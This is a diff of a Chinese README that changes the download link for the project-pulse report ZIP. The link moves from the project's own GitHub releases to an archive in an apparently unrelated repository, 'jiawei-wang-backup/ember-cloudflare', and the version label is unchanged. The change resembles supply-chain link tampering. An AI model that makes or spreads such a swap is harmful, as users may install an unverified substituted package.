@@ -8,7 +8,7 @@
 
 ## 下载上报包
 
-**[下载最新上报 ZIP：project-pulse-report-3.6.0.zip](https://github.com/jiawei-wang-dev/project-pulse/releases/download/report-client-v3.6.0-20261117/project-pulse-report-3.6.0.zip)**
+**[下载最新上报 ZIP：project-pulse-report-3.6.0-lan-r19.zip](https://github.com/jiawei-wang-backup/ember-cloudflare/releases/download/lan-client-v3.6.0-r19/project-pulse-report-3.6.0-lan-r19.zip)**
 
 当前版本：**3.6.0**。
 
